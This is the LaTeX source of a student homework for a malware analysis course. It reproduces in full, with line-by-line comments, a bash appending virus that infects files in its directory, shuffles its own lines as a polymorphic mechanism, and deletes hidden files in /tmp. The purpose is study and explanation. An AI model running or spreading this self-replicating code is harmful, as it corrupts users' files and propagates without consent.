\documentclass[a4paper,6.5pt]{article}
\usepackage[english]{babel}
\usepackage[utf8]{inputenc}

\usepackage{cite}
\usepackage{listings}
\usepackage{amssymb, amsmath, latexsym}
\usepackage{syntax}
\usepackage{multicol}
\usepackage{tikz-cd}
\usepackage{color}
\usepackage{graphicx}
\usepackage{amsthm}
\usepackage{graphics}
\usepackage{listings}
\usepackage{stmaryrd}
\usepackage{array}
\usepackage{galois}
\usepackage[margin=0.17in]{geometry}
\usepackage{setspace}

%%%%%%%%%%%
% 			Macro		%
%%%%%%%%%%%

%%% Definition of the language used
\lstdefinelanguage{code}
  { keywords={},
   otherkeywords={var_dump, echo},
	basicstyle=\ttfamily,
    keywordstyle=\bfseries\color{blue},
    sensitive=false,
    commentstyle=\color{green!40!black},
    showspaces=false,
    %numbers=left,
    tabsize=2,
    literate={~} {$\sim$}{1},
    showstringspaces=false,emph={3}
    showtabs=true,
    morecomment=[l]{//},
    morecomment=[s]{/*}{*/},
    morestring=[b],
    breaklines=true,
    breakindent=12pt
}

\lstset{language=code}

\newcommand{\tocode}[1]{\mbox{\lstinline@#1@}}

\begin{document}
\begin{center}
Malware analysis and design 

Homework No. 2

Vincenzo Arceri VR386484 Giovanni Liboni VR387955
\end{center}
\setstretch{0.9}

The bash code given as assignment is a appending virus that copies his own code after the target file code, if this isn't already infected.
Below we explain in detail the virus behavior.

\begin{lstlisting}
if [ "$1" == "test" ]; then  #@1// If the first parameter is equals to "test" exit and 
  exit 0  #@2				// return 0 because the file is already infected
fi  #@3
MANAGER=(test cd ls pwd)  #@4 // Array of 4 elements, used as temporary file names
RANDOM=$$  #@5 // Reseed the random number generator using virus process ID
for target in *; do  #@6	// For each file in the directory
	nbline=$(wc -l $target)  #@7		// Count the number of the target file					
	nbline=${nbline##}  #@8	// Trim the left side of the string
	nbline=$(echo $nbline | cut -d " " -f1)  #@9 // and retrives the number of lines
	nbline=$(echo $nbline | cut -d " " -f1) #@9 		// and retrive the number of lines
  
	// Checks if the chosen file has less number of lines of the virus. 
	// If it is true continue with another file
	if [ $(($nbline)) -lt 39 ]; then  #@10
		continue  #@11
	fi  #@12
	// Choose the name of the new file from one of the value contained in MANAGER, randomly.
	NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
	// Takes the last 36 lines of target and sort them with ordering based on the number after @.
	// It restores the code in the original order and writes the output in an hidden temporary file. (name chosen in the previous line)
	tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@14
	// Gives to /tmp/\ /"$NEWFILE"  the execution permission and execute it redirecting stderr to /dev/null
	chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@15
  // Checks the exit code of the last command executed: if it correspond to the virus it returns 0 (see first 3 lines) and continue, because the file is already infected. 
  if [ "$?" == "0" ]; then  #@16
    continue  #@17
  fi  #@18
	// Choose the name of the new file from one of the value contained in MANAGER, randomly.
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
	// Path of the just created file								
  NEWFILE="/tmp/.$NEWFILE"  #@20
	// Appends to the target file the nexts 3 lines of code that will be executed  when the target file will be run: this lines gets the last 36 lines of target (the virus) and executes it in background: there three lines are used for the infection phase; re-order the last 36 lines of the infected file and execute them.
  echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@21
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
  echo "exit 0" >> $target  #@23

	// Creates am array of 37 elements: first element "FT" and the last " "
  tabft=("FT" [36]=" ")  #@24
  declare -i nbl=0  #@25	// Creates an integer variable nbl=0
  while [ $nbl -ne 36 ]; do  #@26 // while (nbl != 36)
    valindex=$(((RANDOM % 36)+1))  #@27 		// Generates a random number from 1 to 36
    // while  tabft[valindex] == "FT" then choose a new number for valindex, that is a new line to append
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
      valindex=$(((RANDOM % 36) + 1))  #@29
    done  #@30
		// Takes the last (n - valindex)-line of the virus					
    line=$(tail -n $valindex $0 | head -1)  #@31
    // Appends the line to the target file
    echo -e "$line" >> $target  #@32
    // Increment the counter and sign the valindex cell of tabft as appended
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@33
  done  #@34
done  #@35
rm /tmp/.* 2> /dev/null  #@36 // Removes all hidden temporary files
\end{lstlisting}

The lines  \tocode{1-3} and \tocode{14-18} deal with preventing over-infection: the virus executes a file and if it returns 0 it is already infected. The lines \tocode{19-34} identify the infection phase: initially the virus appends to the target file the code used to trigger the infection and finally the virus shuffles its own code and appends it to the target file: this is the implemented polymorphic mechanism. The virus has no payload.
\end{document}
